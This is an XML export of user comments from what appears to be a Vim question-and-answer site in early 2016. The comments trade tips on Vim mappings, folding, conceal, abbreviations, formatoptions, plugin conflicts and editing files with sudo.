  <row Id="10767" PostId="1969" Score="0" Text="So far, I've been using VAM for more than a decade and I'm happy with it. Yet, I've used vim-flavor as it's much simpler to integrate from travis -- in order to test my plugins. And unfortunately, both use a different syntax to declare dependencies." CreationDate="2016-02-29T14:40:15.497" UserId="626" />
  <row Id="10768" PostId="6716" Score="2" Text="If you switch to Shougo's `neosnippet` plugin, its syntax has an `alias` keyword for this very purpose." CreationDate="2016-02-29T19:10:05.373" UserId="1800" />
  <row Id="10770" PostId="6726" Score="2" Text="The way I see it, it's a clever way to create a custom leader. If you only press `f` in your example, it will be resolved to `[unite]` (due to the `nmap`), which in turn resolves to `&lt;Nop&gt;`, i.e. nothing, but only after the map timeout, or if **not** followed by one of the defined combinations, such as `c`, in which case it suddenly turns into `[unite]c`, which resolves to the mapped command :) Basically, `f` turns to nothing, but `fc` turns to the mapped command. `[unite]` is just a convenient placeholder, you can use other text if you want. Vim won't interpret its characters individually." CreationDate="2016-03-01T00:38:59.140" UserId="1800" />
  <row Id="10771" PostId="6726" Score="0" Text="OK I see, this is indeed really clever. What about the `[` square bracket `]` ? Does they means &quot;treats this as one symbol&quot; ?" CreationDate="2016-03-01T00:50:21.580" UserId="1821" />
  <row Id="10772" PostId="6726" Score="2" Text="Nope, they are no more special than any other characters. They are for your eyes only, to look like a prefix key. :)" CreationDate="2016-03-01T00:51:02.767" UserId="1800" />
  <row Id="10773" PostId="6726" Score="0" Text="So I can imagine `nnoremap myprefix &lt;nop&gt;` and then using `myprefix` anywhere ? or using `{}` instead ?" CreationDate="2016-03-01T01:17:02.813" UserId="1821" />
  <row Id="10774" PostId="6723" Score="0" Text="If you don't like the triple slashes you could also do `let &amp;path = path . ',C:/Program Files (x86)...,C:/...'`, using a single quoted literal string after a `let` with string concatenation. The two C: bits are your two paths and there's a comma separating each path including these from what's existing." CreationDate="2016-03-01T04:34:59.530" UserId="6430" />
  <row Id="10775" PostId="6251" Score="1" Text="It might also be worth noting that you can call functions from the command line, in case you want to jump to a specific column and row you can just do `vim &quot;+call cursor(8, 16)&quot; myfile.txt` to jump to line 8, column 16. (I use this when launching Vim from other editors/debuggers.)" CreationDate="2016-03-01T04:44:01.637" UserId="6430" />
  <row Id="10776" PostId="6710" Score="0" Text="The `$` character isn't required if you just want to go to the last line, simply putting `+` on the command line is sufficient." CreationDate="2016-03-01T04:48:01.010" UserId="6430" />
  <row Id="10777" PostId="6251" Score="1" Text="@dash-tom-bang this is good. I didn't know that there is a cursor method. Thank you." CreationDate="2016-03-01T05:37:50.640" UserId="5481" />
  <row Id="10778" PostId="802" Score="1" Text="Documentation for `:startinsert`: http://vimdoc.sourceforge.net/htmldoc/insert.html#:startinsert" CreationDate="2016-03-01T06:08:23.453" UserId="2334" />
  <row Id="10780" PostId="6726" Score="0" Text="@VanLaser: do you want to make an answer to this question? I'll do it otherwise" CreationDate="2016-03-01T06:59:30.477" UserId="1821" />
  <row Id="10781" PostId="6726" Score="1" Text="Do it, please :) There is a side-effect of choosing a certain 'prefix' - e.g. `[unite]` could affect a map defined in the same buffer, made from its first letters (e.g. `[u`) in that Vim will now wait to see if you type `n` after it, or not." CreationDate="2016-03-01T08:36:46.193" UserId="1800" />
  <row Id="10782" PostId="6727" Score="3" Text="And what about `:make` (there are no reasons nowadays to use `:!make`)?" CreationDate="2016-03-01T08:57:33.593" UserId="626" />
  <row Id="10783" PostId="6730" Score="0" Text="Hi, does this provide help http://stackoverflow.com/a/8096378/2558252 ?" CreationDate="2016-03-01T09:10:03.607" UserId="1821" />
  <row Id="10784" PostId="6730" Score="2" Text="@Nobe4 Looks like from that link it may not be possible." CreationDate="2016-03-01T09:17:29.173" UserId="5650" />
  <row Id="10785" PostId="6733" Score="0" Text="Does any help article relate to this ?" CreationDate="2016-03-01T15:15:43.893" UserId="1821" />
  <row Id="10786" PostId="6733" Score="0" Text="@Nobe4, not to my knowledge." CreationDate="2016-03-01T15:18:34.157" UserId="54" />
  <row Id="10787" PostId="6731" Score="0" Text="There is an open issue on Github for keyword highlighting to be included in the most up-to-date Python syntax file I am aware of: https://github.com/hdima/python-syntax/issues/44 You might want to check there later. If you figure out how to do it, please let the people there know (or message me so I can create a pull request) for this feature to be available for everyone." CreationDate="2016-03-01T17:33:40.037" UserId="3282" />
  <row Id="10788" PostId="6731" Score="0" Text="Yeah, I'm the one who have opened it." CreationDate="2016-03-01T17:37:11.630" UserId="6634" />
  <row Id="10789" PostId="6730" Score="0" Text="not possible. One is called a statusline, the other is the commandline. It is not possible to hide the commandline (and it wouldn't make sense anyhow)." CreationDate="2016-03-01T18:05:18.667" UserId="71" />
  <row Id="10790" PostId="6727" Score="0" Text="@Nobe4 : can you clarify a bit where/how do I use silent?" CreationDate="2016-03-01T18:56:07.290" UserId="2199" />
  <row Id="10791" PostId="6727" Score="0" Text="@LucHermitte: `:make` in vim-latex-suite executes `pdflatex` in its own way. I have lots of other targets for different graphics and bibliography in my own GNU Makefile. This is why I need to run the actual make. If there is a way to get it working with just `:make` please let me know." CreationDate="2016-03-01T18:57:32.290" UserId="2199" />
  <row Id="10792" PostId="6736" Score="1" Text="Do you want to prevent the `:normal` command from consuming the rest of the line? If so you could wrap it inside a string that you could execute with the `:execute` command: `:exe 'norm f,50a ^[d44|' | other Ex command`." CreationDate="2016-03-02T00:54:12.443" UserId="4939" />
  <row Id="10793" PostId="6736" Score="0" Text="`:execute` will only pass the string as an argument to `:normal`, and so the latter won't see what's after on the command line, allowing you to add other Ex commands. There's just a thing to pay attention to, if the string contains non literal control characters like `\e` for `&lt;Esc&gt;` you have to use double quotes to allow Vim to interpret them, otherwise single quotes prevent the interpretation of anything inside the string." CreationDate="2016-03-02T01:10:53.590" UserId="4939" />
  <row Id="10794" PostId="6736" Score="0" Text="@saginaw, would you mind adding that as an answer so I can accept it?  :)" CreationDate="2016-03-02T01:41:18.760" UserId="4676" />
  <row Id="10795" PostId="4935" Score="0" Text="Not a bad answer at all." CreationDate="2016-03-02T01:45:51.393" UserId="4676" />
  <row Id="10796" PostId="6735" Score="2" Text="I don't think the OP is talking about the status line.  (airline)" CreationDate="2016-03-02T03:15:19.723" UserId="865" />
  <row Id="10797" PostId="6735" Score="0" Text="The OP wants to get rid of the redundant line. Removing the status line is easy, removing the command line is likely not possible (nor particularly useful unless you never leave insert mode)." CreationDate="2016-03-02T03:25:50.757" UserId="6430" />
  <row Id="10798" PostId="6727" Score="2" Text="@Bichoy You can unset `makeprg` to get `:make` to run `make` again." CreationDate="2016-03-02T04:55:02.557" UserId="205" />
  <row Id="10799" PostId="6738" Score="0" Text="I'm afraid you'll need to define both your folding function (`&amp;foldexpr`), and the `&amp;foldtext` function as well. I've done similar things in [VimFold4C](https://github.com/LucHermitte/VimFold4C), except I've never tried to fold only one line. I don't know if this is possible. But what about the conceal feature?" CreationDate="2016-03-02T09:28:51.630" UserId="626" />
  <row Id="10800" PostId="6738" Score="0" Text="@LucHermitte: [`:h 'foldexpr'`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27foldexpr%27) says `it is evaluated for each line to obtain its fold level` so I guess that wouldn't work on a single line. I don't know very well the `conceal` feature but from what I've read it might be the good way to go indeed. Thanks for the heads up!" CreationDate="2016-03-02T09:36:27.973" UserId="1841" />
  <row Id="10801" PostId="6738" Score="0" Text="@LucHermitte: I was also thinking about conceal, but it can only display one character in place of the concealed string.&#xA;&#xA;statox: does it suit you to fold with only one char ? If so I can try something with the conceal feature." CreationDate="2016-03-02T09:37:22.747" UserId="1821" />
  <row Id="10802" PostId="6738" Score="1" Text="@Nobe4: Actually having only one character between the brackets to indicate a fold could be a good option." CreationDate="2016-03-02T09:38:52.130" UserId="1841" />
  <row Id="10803" PostId="6738" Score="0" Text="@statox, foldexpr is quite tricky. You can return the current foldlevel, the same as the previous one, or the previous one +1/-1 (which is extremely slow on big files), or start/stop a fold with a specific foldlevel. If you start another fold with the same level as the current level, you may be able to have several functions on single lines. But as I said, I've never tried this IIRC." CreationDate="2016-03-02T09:57:04.387" UserId="626" />
  <row Id="10804" PostId="6739" Score="3" Text="I don't think this is possible in Vim to differentiate a `A` (`S-a` either with right or left shift). Maybe try looking for your terminal or keyboard configuration." CreationDate="2016-03-02T10:30:30.923" UserId="1821" />
  <row Id="10806" PostId="6740" Score="1" Text="You can keep the parenthesis by using `start=+(+hs=e+1 end=+)+he=e-1`. This will also avoid collapsing completely empty pairs of parenthesis (whitespace between will still be collapsed). If you don't mind unicode, `…` is a one character ellipsis that works nicely for the `cchar`." CreationDate="2016-03-02T15:04:14.863" UserId="2736" />
  <row Id="10807" PostId="5117" Score="0" Text="I don't understand your macro. Specifically, the `4f,` part; this jumps to the fourth comma, but your example string doesn't have any commas. You should probably create a [Minimal, Complete, and Verifiable example](http://meta.vi.stackexchange.com/q/1325/51)." CreationDate="2016-03-02T15:08:48.603" UserId="51" />
  <row Id="10808" PostId="6740" Score="0" Text="can you add a quick comment/reference on your `hs=e+1` `he=e-1` update ?" CreationDate="2016-03-02T15:10:16.767" UserId="1821" />
  <row Id="10809" PostId="6740" Score="1" Text="From `:help :syn-pattern-offset`: `hs` is the offset for where the highlighting starts, `he` is the offset for the end. `e+1` and `e-1` are the actual offsets, in this case one character right (`+`) or left (`-`) of the end of the matched pattern." CreationDate="2016-03-02T15:18:52.880" UserId="2736" />
  <row Id="10810" PostId="6740" Score="0" Text="And it occurs to me that the end should probably actually be `end=+)+he=s-1`, or offset one character left of the start of the pattern. Offsetting from the end works in this case since the pattern is one character, but offsetting from the start of the end pattern works for multi-character patterns (such as `/* ... */` comments)." CreationDate="2016-03-02T15:23:55.883" UserId="2736" />
  <row Id="10811" PostId="6741" Score="0" Text="Any suggestion for Mac? I'll wait a while and se of there are other answers. If not I will accept this." CreationDate="2016-03-02T15:32:39.337" UserId="3316" />
  <row Id="10812" PostId="3412" Score="0" Text="Note that this will *only* profile the startup time, and nothing else. It's useful, but very limited." CreationDate="2016-03-02T15:41:35.650" UserId="51" />
  <row Id="10813" PostId="6741" Score="0" Text="@Andreas [this site](http://alternativeto.net/software/autohotkey/?platform=mac) lists AHK alternatives for Mac" CreationDate="2016-03-02T16:23:53.060" UserId="1405" />
  <row Id="10815" PostId="6738" Score="0" Text="@LucHermitte: Thanks for this clarification! Even if I found another solution I think that I'll try to play a little bit with `foldexpr` because it seems to be able to create some pretty cool tricks." CreationDate="2016-03-02T16:36:54.683" UserId="1841" />
  <row Id="10816" PostId="6741" Score="0" Text="I highly recommend Seil (the karabiner's successor) :)" CreationDate="2016-03-02T18:58:16.963" UserId="1821" />
  <row Id="10817" PostId="6743" Score="4" Text="use `inoremap` instead of `imap`" CreationDate="2016-03-02T20:50:50.253" UserId="71" />
  <row Id="10818" PostId="4935" Score="0" Text="@Wildcard, thank you; (it is too speculative)." CreationDate="2016-03-02T21:07:56.097" UserId="3002" />
  <row Id="10819" PostId="6739" Score="0" Text="Just a note - *why* is this a bad habit? Type however works for you, and is most comfortable." CreationDate="2016-03-02T22:56:57.287" UserId="4932" />
  <row Id="10820" PostId="6739" Score="0" Text="@frugle It is a bad habit because it is uncomfortable and often makes me stretch my fingers in awkward positions that interrupt my typing. For me, the beauty of vim is how it allows for speed and flow, and this habit breaks that." CreationDate="2016-03-03T00:02:25.067" UserId="3316" />
  <row Id="10821" PostId="6748" Score="0" Text="Ah very cool, I just  tested now, yes so - if you wanted to open the current buffer in a new tab using `:tabe %`, but the buffer *had unsaved changes* - vim blocks the action and throws `E:37 no write change - add ! to override`" CreationDate="2016-03-03T01:13:00.087" UserId="4603" />
  <row Id="10822" PostId="6739" Score="0" Text="Fair point. But as note RE: speed and flow, wont you break your flow if you habitually type &lt;LShift&gt;+d, which wont output anything, and then have to remember to use your &lt;Rshift&gt;+d mapping, instead? And there are times when using &lt;LShift&gt;+d could be warranted (One handed typing, or if your right hand is on a numpad, etc.), which this mapping will prevent you from doing, presenting further potential disruptions down the line. It seems that this mapping causes a circular problem (Problem A causes symptom B, Fix problem A with solution C that also causes symptom B). Better to fix the root problem" CreationDate="2016-03-03T01:44:14.073" UserId="4932" />
  <row Id="10823" PostId="6749" Score="9" Text="Yeah, I find this annoying too. I just tend to use marks for that purpose: ```mm &quot;+yap `m``` (Note that ```&quot;+y``` yanks to your system clipboard)" CreationDate="2016-03-03T04:06:17.657" UserId="4932" />
  <row Id="10824" PostId="6749" Score="2" Text="I find it way useful to have the cursor placed either at the start, or at the end of the yanked zone. After all, what can I now do, with yanked text, and cursor inside it? It doesn't make much sense to do a put/paste now. But, if I want to do that later, it means I could also yank later ... maybe what you need now is just a mark." CreationDate="2016-03-03T07:52:03.613" UserId="1800" />
  <row Id="10825" PostId="6739" Score="0" Text="The idea is to implement the mapping only to unlearn the bad habit and then remove the mapping. I've done this before with some success. I have a mapping &lt;jj&gt; to delete the last word while in insert mode to avoid having to repeatedly smash backspace. To get the hapit of using it I also had to map thee successive presses on backspace to do nothing. When I had learnt not to flail at backspace I removed this second mapping." CreationDate="2016-03-03T08:36:59.297" UserId="3316" />
  <row Id="10826" PostId="6739" Score="0" Text="Think HardMode." CreationDate="2016-03-03T08:40:09.237" UserId="3316" />
  <row Id="10827" PostId="6583" Score="0" Text="I'm voting to close this question as off-topic because it was handled at the project's issue tracker." CreationDate="2016-03-03T11:33:27.777" UserId="51" />
  <row Id="10828" PostId="6543" Score="0" Text="I'm voting to close this question as off-topic because this is a bug in NERDTree, and is better reported on the NERDTree issue tracker." CreationDate="2016-03-03T11:43:37.713" UserId="51" />
  <row Id="10829" PostId="6541" Score="3" Text="&quot;Another language&quot; is rather vague. What language? Polish? Hebrew? Chinese? Klingon? If you're using an obscure language it's very possible that none of those fonts support that language." CreationDate="2016-03-03T11:45:41.730" UserId="51" />
  <row Id="10830" PostId="6757" Score="0" Text="I'm thinking of making a mapping zæ that checks if the word under the cursor with e for æ is good; if it is not good, nothing happens; if it is good, it is marked as bad, and the word with æ is marked as good. Not quite sure how to do it yet though, but I imagine it should be fairly easy." CreationDate="2016-03-03T12:29:49.643" UserId="4505" />
  <row Id="10831" PostId="6757" Score="0" Text="@Lawrence Not sure if mapping æ will work if I understand [the comments here](http://vi.stackexchange.com/q/6629/51) correctly..." CreationDate="2016-03-03T12:33:07.377" UserId="51" />
  <row Id="10832" PostId="6757" Score="0" Text="I already did it with a temporary solution: `nmap zæ yawPfærezwdawbzg`. Maybe it is only an issue with ctrl." CreationDate="2016-03-03T12:34:31.997" UserId="4505" />
  <row Id="10833" PostId="6330" Score="1" Text="No, and I think this is in the todo list to have this fixed. Also according to Bram, things like '|' should consider concealed items." CreationDate="2016-03-03T13:08:43.510" UserId="71" />
  <row Id="10834" PostId="6754" Score="0" Text=":verbose answered my question!" CreationDate="2016-03-03T15:15:13.197" UserId="4751" />
  <row Id="10835" PostId="6755" Score="2" Text="+1: I always used `'.`, but it can be very useful to navigate between the last changes with `g;` and `g,`." CreationDate="2016-03-03T16:26:56.690" UserId="1405" />
  <row Id="10836" PostId="6756" Score="0" Text="I will try this and update the results. Thanks." CreationDate="2016-03-03T18:18:25.820" UserId="5328" />
  <row Id="10837" PostId="5989" Score="0" Text="The `|` character pipes the output of one command to another. `wea-this` is not a command. Piping cannot be used to achieve what you're looking to do either; it'll cause Vim's stdin to be the left hand application, not the keyboard. If you want to get stdin into a buffer in vim, start it with a minus for the filename: `echo Hello, world! | vim -`." CreationDate="2016-03-03T19:38:34.520" UserId="6430" />
  <row Id="10838" PostId="737" Score="0" Text="`:help stdin`... It's amazing how fast one can find the answers by asking their question of the built in documentation." CreationDate="2016-03-03T20:07:47.340" UserId="6430" />
  <row Id="10839" PostId="6755" Score="2" Text="Is there a version of `g;` which takes you to the correct column position as well?" CreationDate="2016-03-03T23:19:56.503" UserId="5373" />
  <row Id="10840" PostId="6752" Score="1" Text="Nice to know about, but is that what you actually do?  It seems typing the 8 keystrakes, with two brackets, makes this harder than the mark solutions" CreationDate="2016-03-03T23:24:37.400" UserId="5373" />
  <row Id="10841" PostId="6751" Score="0" Text="I like this.  Is there a way to make single quote behave like backtick in general, when jumping?  single quote is easier to type, and usually i want to jump to the correct column position as well as the right line..." CreationDate="2016-03-03T23:28:54.637" UserId="5373" />
  <row Id="10842" PostId="4692" Score="0" Text="You mentioned that you can access buffer-local variables from other buffers. How exactly is this done?" CreationDate="2016-03-03T23:57:59.660" UserId="6665" />
  <row Id="10843" PostId="4692" Score="0" Text="@jobo3208 You can use the [`getbufvar()`](http://vimhelp.appspot.com/eval.txt.html#getbufvar%28%29) function. In the first argument you tell it which buffer to use." CreationDate="2016-03-03T23:59:16.217" UserId="51" />
  <row Id="10844" PostId="4692" Score="0" Text="Awesome, couldn't find that anywhere. Thanks!" CreationDate="2016-03-04T00:00:23.573" UserId="6665" />
  <row Id="10845" PostId="4692" Score="0" Text="@jobo3208 I couldn't remember the name from the top of my head either, but I found it in [`:help function-list`](http://vimhelp.appspot.com/usr_41.txt.html#function%2dlist) and searching for `buffer` ;-)" CreationDate="2016-03-04T00:01:29.483" UserId="51" />
  <row Id="10846" PostId="6751" Score="0" Text="@Jonah, I map `&lt;leader&gt;'` to be `\``, which works quite well for me. (I use `&lt;space&gt;` as my leader.)" CreationDate="2016-03-04T01:28:42.667" UserId="6554" />
  <row Id="10847" PostId="6752" Score="0" Text="That's what I *would* do if I was in your position. But I have no issue with the behavior you describe so I don't actually do that." CreationDate="2016-03-04T07:54:17.467" UserId="54" />
  <row Id="10848" PostId="6755" Score="0" Text="@Jonah that's the behaviour by default. Isn't it working for you? It takes me always to the correct column and line position." CreationDate="2016-03-04T08:20:29.630" UserId="3280" />
  <row Id="10849" PostId="6752" Score="0" Text="@Jonah You still have the option to create a mapping. Something like `:nmap &lt;key&gt; :'{,'}y&lt;CR&gt;` should do the job." CreationDate="2016-03-04T08:31:39.220" UserId="1841" />
  <row Id="10850" PostId="6751" Score="0" Text="@Jonah: As Numeri said a mapping can be a good solution, otherwise if you want to get rid of backtick you can have a look at [`:h 'langmap'`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27langmap%27). I'm not saying it's the ideal solution but maybe it could be interesting for you." CreationDate="2016-03-04T08:35:34.533" UserId="1841" />
  <row Id="10851" PostId="6759" Score="3" Text="And if you use `echom` another interesting command is `:messages` to get the full log of the messages echoed. It can sometimes be useful to look at them after the startup." CreationDate="2016-03-04T08:43:34.783" UserId="1841" />
  <row Id="10852" PostId="6760" Score="0" Text="Thanks for you help. I didn't know that I can add my custom syntax without modifying existing rules. Your pattern doesn't match keyword argument if it's a first argument in function. I'll try to fix that myself (I'm learning regexps right now to do that). As soon as I will learn how to do that I will post a comment." CreationDate="2016-03-04T10:07:10.760" UserId="6634" />
  <row Id="10853" PostId="6760" Score="0" Text="I'm trying this regexp via vim search and I think that it matches only one keyword in function call. I need it to match all of them'" CreationDate="2016-03-04T10:16:29.480" UserId="6634" />
  <row Id="10854" PostId="6760" Score="0" Text="@user1685095: Yep you're right my pattern isn't good. I'll try to improve it and edit my answer." CreationDate="2016-03-04T10:23:12.163" UserId="1841" />
  <row Id="10855" PostId="6758" Score="0" Text="This seems to work well for getting the length of the concealed line, but it does not quite work as a substitute for `col()`. I would add an argument that is passed to `col` and `virtcol`. Anyway, thanks!" CreationDate="2016-03-04T12:46:26.667" UserId="21" />
  <row Id="10856" PostId="6763" Score="1" Text="I understand. However, I am interested to only find the SpellLocal mistakes. There is the motion key ]S which only cares about the SpellBad mistakes.  How to do the analog for the SpellLocal mistakes?" CreationDate="2016-03-04T14:19:04.560" UserId="6673" />
  <row Id="10857" PostId="6763" Score="0" Text="I see, but from the reading I have of the documentation, I don't see anything related to it." CreationDate="2016-03-04T14:34:56.133" UserId="1821" />
  <row Id="10858" PostId="6764" Score="1" Text="Sounds like it should work, but it doesn't (at least for me). `SRChooseHiGrp` does not select the correct group. However, this can be overcome by `SRChooseHiGrp 31`. However, afterwards `SRSearch` finds nothing. You can check this (unexpected behavior) with  `SRChooseHiGrp 28` (searching for bad spelling mistakes)." CreationDate="2016-03-04T15:36:48.370" UserId="6673" />
  <row Id="10859" PostId="6764" Score="0" Text="@Fabian: Indeed as I don't usually have spelling enabled I tested the plugin with some other highlighting groups (which worked) but after further investigations this doesn't find words in SpellBad... I suspect a bug in the plugin, I'll try to look at it and edit the answer if I find something." CreationDate="2016-03-04T15:59:14.730" UserId="1841" />
  <row Id="10860" PostId="6758" Score="0" Text="@KarlYngveLervåg Yeah, it could be expanded a bit :-) Feel free to edit!" CreationDate="2016-03-04T16:38:31.077" UserId="51" />
  <row Id="10861" PostId="6765" Score="0" Text="It is strange, because `iabbr funciton function` works fine here when typing `funciton(` -- it doesn't requires any spaces." CreationDate="2016-03-04T19:25:41.393" UserId="1405" />
  <row Id="10862" PostId="6765" Score="0" Text="@mMontu it didn't work for me. Edit - worked with plugins/vimrc disabled." CreationDate="2016-03-04T19:32:07.137" UserId="3280" />
  <row Id="10863" PostId="6765" Score="0" Text="@Al.G. maybe some plugin/configuration? Because it worked fine here even in vanilla vim. Try starting vim with `vim -u NONE -U NONE -N -i NONE`, them try the contents of my previous comment." CreationDate="2016-03-04T19:34:40.473" UserId="1405" />
  <row Id="10867" PostId="6765" Score="0" Text="In my case it's definitely a plugin, but it'd be hard to tell of 20 which one is causing it. Do you know about some quick way of disabling them one by one? (except `set rtp-=~/.vim/pluginname`)" CreationDate="2016-03-04T19:57:17.210" UserId="3280" />
  <row Id="10868" PostId="6766" Score="0" Text="For me, the culprit was vim-smartinput, which completes parentheses, brackets, etc.  Not surprising I guess, but it leaves me without a way to do one thing or the other.  Thanks for the help.  It didn't occur to me that it could be a plugin until you mentioned it." CreationDate="2016-03-04T20:04:20.313" UserId="6526" />
  <row Id="10869" PostId="6767" Score="0" Text="Thanks. This is exactly what I wanted..." CreationDate="2016-03-04T22:00:03.753" UserId="6673" />
  <row Id="10870" PostId="6769" Score="0" Text="This plugin made that so easy. I didn't look under the hood, but thought I'd try `:%S/CamelCase/AnotherCase/g`, however it only replaces `CamelCase` and left `camelCase` as is. No big deal, just something to remember." CreationDate="2016-03-04T23:15:13.067" UserId="6674" />
  <row Id="10871" PostId="6744" Score="0" Text="This seems still not working for me. But thanks anyway." CreationDate="2016-03-04T23:56:46.210" UserId="2788" />
  <row Id="10872" PostId="6744" Score="0" Text="@WanxinGao Does it work if you uncomment the `color solarized`? If not, try disabling the plugins that SPF13 includes and see if that fixes it..." CreationDate="2016-03-05T00:06:04.077" UserId="51" />
  <row Id="10873" PostId="6769" Score="0" Text="It's likely using smartcase or something to that effect so that any upper case characters are required to be upper case but lower case can be capitalized as necessary." CreationDate="2016-03-05T00:19:43.843" UserId="6430" />
  <row Id="10874" PostId="2285" Score="0" Text="Keep in mind that `:keeppatterns` showed up at some point after 7.4 was released so if you work on multiple machines with differing versions of Vim, you'll need to use `if exists(':keeppatterns')` before using it. (I suspect the restoration of the previous search pattern showed up after release as well, otherwise I wouldn't have it in my vimrc.)" CreationDate="2016-03-05T00:51:19.380" UserId="6430" />
  <row Id="10875" PostId="456" Score="1" Text="A more user friendly way to restore the cursor position is to save and restore the whole view: `let l:winview = winsaveview()` and `call winrestview(l:winview)`." CreationDate="2016-03-05T00:54:26.397" UserId="6430" />
  <row Id="10877" PostId="3029" Score="1" Text="`winsaveview()` and `winrestview()` are far superior." CreationDate="2016-03-05T01:01:03.553" UserId="6430" />
  <row Id="10879" PostId="6772" Score="3" Text="Are you using the 32bit version of Python or the 64bit? Your Vim is a 32bit version, and only works with 32bit Python libraries." CreationDate="2016-03-05T04:42:20.217" UserId="51" />
  <row Id="10881" PostId="6772" Score="0" Text="@Carpetsmoker thanks for the tips. I get the same issue on my mingw64 installation of Vim, which does indeed have python enabled. I have updated the post. Also, I'm running python 64 bits, which should be compatible. Any other clues on what I could be missing? Thank you!" CreationDate="2016-03-05T08:12:37.393" UserId="6664" />
  <row Id="10882" PostId="6772" Score="0" Text="You should take a look at the plugin's issue tracker." CreationDate="2016-03-05T09:20:39.187" UserId="54" />
  <row Id="10883" PostId="6772" Score="0" Text="What error does `:py` or `:py3` throw? @romainl What's the point of looking at the plugin's issue tracker, when *Vim itself* isn't loading Python?" CreationDate="2016-03-05T09:26:18.537" UserId="205" />
  <row Id="10884" PostId="6774" Score="3" Text="That's half of the `formatoptions` strings right there. Can you explain which particular combination of these solves this problem?" CreationDate="2016-03-05T10:13:29.123" UserId="205" />
  <row Id="10885" PostId="6773" Score="0" Text="For the note, you can do it manually using `gqap` in normal mode. I actually prefer to do it manually than having to fight it" CreationDate="2016-03-05T11:16:32.827" UserId="4434" />
  <row Id="10886" PostId="6775" Score="1" Text="Thanks! That works well. However, wouldn't `setlocal` make more sense? Also, could you please explain `set fo+=q`? I looked in the help and it said `q` was `Allow formatting of comments with &quot;gq&quot;…`, which seemed to suggest it wouldn't alter the *automatic* formatting." CreationDate="2016-03-05T12:43:21.700" UserId="1278" />
  <row Id="10887" PostId="6774" Score="1" Text="Thank you, that works. FWIW the `q` option is key here. i.e. in combination, the minimum that works for me is `setl fo=awq`." CreationDate="2016-03-05T12:44:33.767" UserId="1278" />
  <row Id="10888" PostId="6775" Score="0" Text="@Sparhawk `setlocal` would be better yes, these were commands I manually entered, so I just went with `set`. I don't know why `q` affects this, but it does, and has done so for some time now, as the trail of links shows. :/" CreationDate="2016-03-05T12:47:23.467" UserId="205" />
  <row Id="10889" PostId="6775" Score="0" Text="Okay, thanks for the explanation. I'll accept this answer because it's minimal and hence easier to follow the help." CreationDate="2016-03-05T12:55:43.867" UserId="1278" />
  <row Id="10890" PostId="6777" Score="0" Text="It does show for me in insert mode. Did you try with plugins disabled? Try with an empty vimrc (`vim --noplugin` and `vim -u NONE`)." CreationDate="2016-03-05T15:47:11.333" UserId="1296" />
  <row Id="10891" PostId="6777" Score="0" Text="`:verbose set ruler?`" CreationDate="2016-03-05T15:56:26.803" UserId="71" />
  <row Id="10892" PostId="1917" Score="0" Text="This is my preferred method. However alternatively without having to repeatedly press `j` to move the cursor down (step 3), you can type the line number followed by `G` to select until that line. Example: `V150Gd`" CreationDate="2016-03-05T16:08:34.547" UserId="6688" />
  <row Id="10893" PostId="6541" Score="1" Text="In my case, I'm trying Malayalam with GVim 7.4.800 (or thereabouts) with the [Ubuntu Mono](http://font.ubuntu.com/#charset-mono-regular) font. For sample text, see the [Malayalam Wikipedia](https://ml.wikipedia.org/wiki/%E0%B4%AA%E0%B5%8D%E0%B4%B0%E0%B4%A7%E0%B4%BE%E0%B4%A8_%E0%B4%A4%E0%B4%BE%E0%B5%BE). On Linux (Ubuntu and Arch), with the terminal and GVim fonts set to Ubuntu Mono, Malayalam does show up, even if it a bit squished. I have tried the other fonts msinfo mentioned in the second comment." CreationDate="2016-03-05T16:29:06.213" UserId="205" />
  <row Id="10894" PostId="6777" Score="1" Text="Ok, yes it seems to be plugin related (update: YouCompleteMe is the culprit). Also right now it only happens with program files like `.py` or `.cpp`. `.txt` does not have this issue." CreationDate="2016-03-05T16:51:55.473" UserId="1066" />
  <row Id="10895" PostId="6772" Score="0" Text="@muru this is a good clue! It game me this message: &quot;E370: Could not load library msys-python2.7.dll&#xA;E263: Sorry, this command is disabled, the Python library could not be loaded.&quot; - I'll see what I can do to have this DLL loaded. Thanks!" CreationDate="2016-03-05T17:17:05.763" UserId="6664" />
  <row Id="10896" PostId="6779" Score="0" Text="`:h script` or `:h vim-script-intro` (equivalent)" CreationDate="2016-03-05T18:12:51.783" UserId="1800" />
  <row Id="10897" PostId="6780" Score="6" Text="Teach them about `sudo -e`." CreationDate="2016-03-05T18:29:58.840" UserId="54" />
  <row Id="10898" PostId="6783" Score="0" Text="Does this set the runtime path to include `/home/$SUDO_USER/.vim`?" CreationDate="2016-03-05T22:51:58.597" UserId="46" />
  <row Id="10901" PostId="51" Score="0" Text="Is there any evidence in the [two years](https://github.com/neovim/neovim/commit/72cf89bce8e4230dbc161dc5606f48ef9884ba70) that that neovim has been active that it's growing faster, and has better performance?" CreationDate="2016-03-05T23:14:48.690" UserId="1278" />
  <row Id="10903" PostId="6784" Score="0" Text="@Carpetsmoker `sudo` isn't a Linux tool, but `/proc/&lt;PID&gt;/cmdline` is pretty Linux-specific, I think. At any rate, I don't care about Unices in general - only Linux. (And, at the moment, `/proc/&lt;PID&gt;/cmdline` offers the safest way of getting filenames.)" CreationDate="2016-03-06T01:21:40.363" UserId="205" />
  <row Id="10904" PostId="6784" Score="0" Text="`/proc` pre-dates Linux by about a decade. Many systems have a procfs (although they're all slightly incompatible, but it's mostly the same; other systems don't have `/proc/cpuinfo` and that sort of nonsense, but that's not needed here). And I don't see why you need it anyway, as you can just use `$SUDO_COMMAND` (I don't understand why you think it's &quot;not easy to safely do this if filenames contain spaces&quot;)?" CreationDate="2016-03-06T01:33:10.463" UserId="51" />
  <row Id="10905" PostId="6784" Score="0" Text="@Carpetsmoker `/proc` is old, `/proc/.../cmdline` *isn't*, and even on systems that do have it, there's no guarantee they will be NUL-delimited like Linux's `/proc/.../cmdline`. Try `sudoedit 'foo.conf bar.conf' baz.conf` and get me back the correct filenames. (To get into the correct frame of mind, read http://mywiki.wooledge.org/ParsingLs, and imagine you're answering this question on [unix.se].)" CreationDate="2016-03-06T01:36:01.740" UserId="205" />
  <row Id="10906" PostId="6785" Score="2" Text="Well, how did you install it? What's the problem you're trying to solve?" CreationDate="2016-03-06T02:44:48.840" UserId="205" />
  <row Id="10907" PostId="6785" Score="0" Text="apt-get install vim" CreationDate="2016-03-06T02:51:51.240" UserId="5181" />
  <row Id="10909" PostId="6785" Score="1" Text="To locate the executable you can use `which vim` but muru is right when he asks what problem are you trying to solve. You should edit your question and give more details about that." CreationDate="2016-03-06T10:26:29.307" UserId="1841" />
